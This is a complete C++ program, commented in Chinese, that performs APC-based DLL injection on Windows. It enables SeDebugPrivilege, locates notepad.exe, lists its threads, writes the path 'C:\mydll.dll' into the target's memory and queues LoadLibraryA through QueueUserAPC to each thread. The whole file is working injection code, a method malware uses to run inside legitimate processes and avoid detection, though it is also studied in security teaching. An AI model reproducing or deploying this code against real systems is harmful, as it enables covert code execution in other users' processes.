// apc注入.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include "stdafx.h"
#include <windows.h>
#include <Tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>





typedef struct _THREADLIST
{
	DWORD dwThreadId;
	_THREADLIST *pNext;
}THREADLIST;
int q = 0;
//ring3层提权函数
BOOL enableDebugPriv()
{
	HANDLE  hToken;
	LUID    sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)
		)
	{
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}
//通过进程名字获取进程ID
DWORD GetProcessID(const char *szProcessName)
{
	//PROCESSENTRY32这个宏在<Tlhelp32.h>中
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//创建线程快照
	HANDLE SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (SnapshotHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if (!Process32First(SnapshotHandle, &pe32))
	{
		return 0;
	}

	do
	{
		if (!_strnicmp(szProcessName, pe32.szExeFile, strlen(szProcessName)))
		{
			printf("%s的PID是:%d\n", pe32.szExeFile, pe32.th32ProcessID);
			return pe32.th32ProcessID;
		}
		//Process32Next是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后, 我们可以利用Process32Next函数来获得下一个进程的句柄
	} while (Process32Next(SnapshotHandle, &pe32));

	return 0;
}
//链表的插入操作
THREADLIST* InsertThreadId(THREADLIST *pdwTidListHead, DWORD dwTid)
{
	THREADLIST *pCurrent = NULL;
	THREADLIST *pNewMember = NULL;

	if (pdwTidListHead == NULL)
	{
		return NULL;
	}
	pCurrent = pdwTidListHead;

	while (pCurrent != NULL)
	{

		if (pCurrent->pNext == NULL)
		{
			// 定位到链表最后一个元素
			pNewMember = (THREADLIST *)malloc(sizeof(THREADLIST));

			if (pNewMember != NULL)
			{
				pNewMember->dwThreadId = dwTid;
				pNewMember->pNext = NULL;
				pCurrent->pNext = pNewMember;
				return pNewMember;
			}
			else
			{
				return NULL;
			}
		}
		pCurrent = pCurrent->pNext;
	}

	return NULL;
}
//枚举进程中所有线程ID，并插入链表中
int EnumThreadID(DWORD dwPID, THREADLIST * pdwTidList)
{
	int i = 0;

	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	HANDLE SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPID);

	if (SnapshotHandle != INVALID_HANDLE_VALUE)
	{
		if (Thread32First(SnapshotHandle, &te32))
		{
			do
			{
				if (te32.th32OwnerProcessID == dwPID)
				{
					if (pdwTidList->dwThreadId == 0)
					{
						pdwTidList->dwThreadId = te32.th32ThreadID;
					}
					else
					{
						if (NULL == InsertThreadId(pdwTidList, te32.th32ThreadID))
						{
							printf("插入失败!\n");
							return 0;
						}
					}

				}
			} while (Thread32Next(SnapshotHandle, &te32));
		}
	}

	return 0;
}

//注入函数
DWORD Inject(HANDLE hProcess, THREADLIST *pThreadIdList)
{
	THREADLIST *pCurrentThreadId = pThreadIdList;

	const char szInjectModName[] = "C:\\mydll.dll";
	DWORD dwLen = strlen(szInjectModName) + 1;

	PVOID param = VirtualAllocEx(hProcess,
		NULL, dwLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	UINT_PTR LoadLibraryAAddress = (UINT_PTR)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

	if (param != NULL)
	{
		SIZE_T dwRet;
		if (WriteProcessMemory(hProcess, param, (LPVOID)szInjectModName, dwLen, &dwRet))
		{
			while (pCurrentThreadId)
			{
				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pCurrentThreadId->dwThreadId);

				if (hThread != NULL)
				{
					//注入DLL到指定进程
					QueueUserAPC((PAPCFUNC)LoadLibraryAAddress, hThread, (ULONG_PTR)param);
					q++;

				}
				pCurrentThreadId = pCurrentThreadId->pNext;
			}
		}
	}
	return 0;
}


int main()
{
	enableDebugPriv();
	THREADLIST *pThreadIdHead = NULL;
	pThreadIdHead = (THREADLIST *)malloc(sizeof(THREADLIST));
	if (pThreadIdHead == NULL)
	{
		printf("申请失败");
		return 0;
	}

	ZeroMemory(pThreadIdHead, sizeof(THREADLIST));

	DWORD dwProcessID = 0;

	if ((dwProcessID = GetProcessID("notepad.exe")) == 0)
	{
		printf("进程ID获取失败!\n");
		return 0;
	}

	EnumThreadID(dwProcessID, pThreadIdHead);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);

	if (hProcess == NULL)
	{
		printf("打开进程失败");
		return 1;
	}

	Inject(hProcess, pThreadIdHead);
	return 0;
}